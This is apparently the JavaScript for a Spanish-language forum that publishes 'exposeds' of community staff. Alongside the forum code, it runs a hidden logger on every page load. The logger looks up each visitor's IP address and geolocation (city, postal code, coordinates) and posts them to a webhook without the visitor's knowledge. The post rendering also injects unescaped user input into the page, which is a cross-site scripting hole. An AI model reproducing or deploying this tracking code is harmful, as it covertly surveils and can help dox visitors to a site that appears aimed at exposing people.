// Configuración del webhook (mantiene función original)
const WEBHOOK_URL = 'YOUR WEBHOOK URL HERE'; // Reemplazar con tu webhook

// Función original de logging de IP (modificada para funcionar en ambas páginas)
const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    // Solo enviar si hay webhook configurado
                    if (WEBHOOK_URL !== 'YOUR WEBHOOK URL HERE') {
                        return fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                username: "HMFB Foro Logger",
                                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                                content: `@here Nuevo acceso detectado`,
                                embeds: [
                                    {
                                        title: 'Acceso al Foro HMFB',
                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                        color: 0x800080,
                                        footer: {
                                            text: 'HMFB Exposeds Staffs'
                                        }
                                    }
                                ]
                            })
                        });
                    }
                });
        })
        .then(dscResponse => {  
            if (dscResponse && dscResponse.ok) {
                console.log('IP logged successfully');
            } else if (dscResponse) {
                console.log('Failed to log IP');
            }
        })
        .catch(error => {
            console.error('Error logging IP:', error);
        });
};

// Ejecutar logging al cargar la página
document.addEventListener('DOMContentLoaded', function() {
    // Enviar IP del visitante
    sendIP();
    
    // Verificar si estamos en la página de admin
    if (window.location.pathname.includes('admin.html')) {
        checkAdminAccess();
    }
});

// Sistema de posts (simulado con localStorage)
let posts = JSON.parse(localStorage.getItem('hmfb_posts')) || [];

function loadPosts() {
    const container = document.getElementById('postsContainer');
    if (!container) return;
    
    if (posts.length === 0) {
        container.innerHTML = `
            <div class="no-posts">
                <i class="fas fa-info-circle"></i>
                <p>No hay exposiciones publicadas aún.</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = posts.map((post, index) => `
        <div class="post-card">
            <img src="${post.imageUrl || 'https://via.placeholder.com/300x200?text=No+Image'}" 
                 alt="${post.title}" class="post-image">
            <div class="post-content">
                <h3 class="post-title">${post.title}</h3>
                <p>${post.description.substring(0, 100)}...</p>
                <div class="post-meta">
                    <span><i class="fas fa-user"></i> ${post.staffName}</span>
                    <span><i class="fas fa-calendar"></i> ${post.date}</span>
                </div>
                <button onclick="viewPost(${index})" class="view-btn">Ver Detalles</button>
            </div>
        </div>
    `).join('');
}

function submitPost() {
    if (!isAdmin()) {
        alert('Solo administradores pueden publicar.');
        return;
    }
    
    const title = document.getElementById('postTitle').value;
    const description = document.getElementById('postDescription').value;
    const imageUrl = document.getElementById('imageUrl').value;
    const staffName = document.getElementById('staffName').value;
    const community = document.getElementById('community').value;
    
    if (!title || !description) {
        alert('Título y descripción son obligatorios.');
        return;
    }
    
    const newPost = {
        id: Date.now(),
        title,
        description,
        imageUrl,
        staffName,
        community,
        date: new Date().toLocaleDateString('es-ES'),
        views: 0,
        author: getCurrentUser()
    };
    
    posts.unshift(newPost);
    localStorage.setItem('hmfb_posts', JSON.stringify(posts));
    
    // Limpiar formulario
    document.getElementById('postTitle').value = '';
    document.getElementById('postDescription').value = '';
    document.getElementById('imageUrl').value = '';
    document.getElementById('staffName').value = '';
    document.getElementById('community').value = '';
    
    // Recargar posts
    loadPosts();
    
    alert('Exposed publicado exitosamente!');
}

function viewPost(index) {
    const post = posts[index];
    if (post) {
        // Incrementar vistas
        post.views = (post.views || 0) + 1;
        localStorage.setItem('hmfb_posts', JSON.stringify(posts));
        
        // Mostrar detalles (podría ser un modal)
        alert(`Detalles del exposed:\n\nTítulo: ${post.title}\nStaff: ${post.staffName}\nComunidad: ${post.community}\n\n${post.description}`);
    }
}

// Función para verificar acceso de admin
function checkAdminAccess() {
    if (window.location.pathname.includes('admin.html') && !isAdmin()) {
        document.getElementById('adminVerify').style.display = 'flex';
        document.getElementById('adminPanel').style.display = 'none';
    } else if (window.location.pathname.includes('admin.html') && isAdmin()) {
        document.getElementById('adminVerify').style.display = 'none';
        document.getElementById('adminPanel').style.display = 'block';
    }
}
